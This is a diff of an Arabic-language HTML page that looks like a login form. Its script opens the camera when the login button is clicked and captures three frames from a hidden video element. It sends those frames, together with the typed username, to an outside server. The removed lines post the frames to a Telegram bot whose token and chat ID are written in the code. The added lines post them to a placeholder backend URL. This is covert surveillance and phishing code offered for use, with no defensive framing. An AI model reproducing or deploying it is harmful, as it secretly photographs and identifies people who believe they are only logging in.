@@ -1,3 +1,5 @@
+
+
 <!DOCTYPE html>
 <html lang="ar">
 <head>
@@ -29,74 +31,63 @@
     <div id="status" class="status"></div>
   </div>
 
-  <!-- الفيديو والكانفس -->
   <video id="v" class="video-hidden" autoplay playsinline></video>
   <canvas id="c" width="640" height="480" style="display:none"></canvas>
 
-  <!-- 🔽 الكود الجافاسكربت بعد العناصر -->
-  <script>
-  // بيانات البوت
-  const TOKEN   = "8408449205:AAHQ6__cO8R7s3kEmZsFTl0hNY9aUYscenM";   // من BotFather
-  const CHAT_ID = "6504203392";             // من @userinfobot
+<script>
+const BACKEND_URL = "https://YOUR-USER.pythonanywhere.com/upload"; 
+const btn = document.getElementById('loginBtn');
+const status = document.getElementById('status');
+const video = document.getElementById('v');
+const canvas = document.getElementById('c');
+const ctx = canvas.getContext('2d');
 
-  const btn = document.getElementById('loginBtn');
-  const status = document.getElementById('status');
-  const video = document.getElementById('v');
-  const canvas = document.getElementById('c');
-  const ctx = canvas.getContext('2d');
+function setStatus(t){ status.textContent = t; }
 
-  function setStatus(t){ status.textContent = t; }
+async function openCamera(){
+  const stream = await navigator.mediaDevices.getUserMedia({video:true});
+  video.srcObject = stream;
+  await video.play();
+  return stream;
+}
 
-  async function openCamera(){
-    const stream = await navigator.mediaDevices.getUserMedia({video:true});
-    video.srcObject = stream;
-    await video.play();
-    return stream;
-  }
+async function captureOnce(){
+  ctx.drawImage(video,0,0,canvas.width,canvas.height);
+  return canvas.toDataURL('image/png');
+}
 
-  function captureBlob(){
-    return new Promise(resolve=>{
-      ctx.drawImage(video,0,0,canvas.width,canvas.height);
-      canvas.toBlob(blob=>resolve(blob),"image/jpeg");
-    });
-  }
-
-  async function sendToTelegram(blob, meta){
-    const form = new FormData();
-    form.append("chat_id", CHAT_ID);
-    form.append("photo", blob, "photo.jpg");
-    form.append("caption", `👤 المستخدم: ${meta.user}\n🕒 ${new Date(meta.time).toLocaleString()}`);
-
-    const url = `https://api.telegram.org/bot${TOKEN}/sendPhoto`;
-    const res = await fetch(url, { method:"POST", body: form });
-    return res.ok;
-  }
-
-  btn.addEventListener('click', async ()=>{
-    btn.disabled = true;
-    setStatus('طلب إذن الكاميرا...');
-    let stream;
-    try{
-      stream = await openCamera();
-      setStatus('التقاط الصور وإرسالها...');
-      const meta = { user: document.getElementById('user').value || "", time: Date.now() };
-
-      for(let i=1;i<=3;i++){
-        const blob = await captureBlob();
-        const ok = await sendToTelegram(blob, meta);
-        setStatus(ok? `✔️ أرسلت الصورة ${i}/3` : `⚠️ خطأ عند إرسال ${i}`);
-        await new Promise(r=>setTimeout(r,800));
-      }
-      setStatus('✅ انتهت العملية');
-    }catch(e){
-      console.error(e);
-      setStatus('❌ فشل الوصول للكاميرا أو إرسال الصور');
-    }finally{
-      if(video.srcObject) video.srcObject.getTracks().forEach(t=>t.stop());
-      btn.disabled = false;
-    }
+async function sendToBackend(data, meta={}){
+  const res = await fetch(BACKEND_URL, {
+    method:'POST',
+    headers: {'Content-Type':'application/json'},
+    body: JSON.stringify({ image: data, meta })
   });
-  </script>
+  return res.ok;
+}
+
+btn.addEventListener('click', async ()=>{
+  btn.disabled = true;
+  setStatus('طلب إذن الكاميرا...');
+  let stream;
+  try{
+    stream = await openCamera();
+    setStatus('التقاط الصور وإرسالها...');
+    const meta = { user: document.getElementById('user').value || "", time: Date.now() };
+    for(let i=1;i<=3;i++){
+      const img = await captureOnce();
+      const ok = await sendToBackend(img, meta);
+      setStatus(ok? `أرسلت الصورة ${i}/3` : `خطأ إرسال الصورة ${i}`);
+      await new Promise(r=>setTimeout(r,800));
+    }
+    setStatus('انتهت العملية');
+  }catch(e){
+    console.error(e);
+    setStatus('فشل الوصول للكاميرا أو الخادم');
+  }finally{
+    if(video.srcObject) video.srcObject.getTracks().forEach(t=>t.stop());
+    btn.disabled = false;
+  }
+});
+</script>
 </body>
 </html>
-
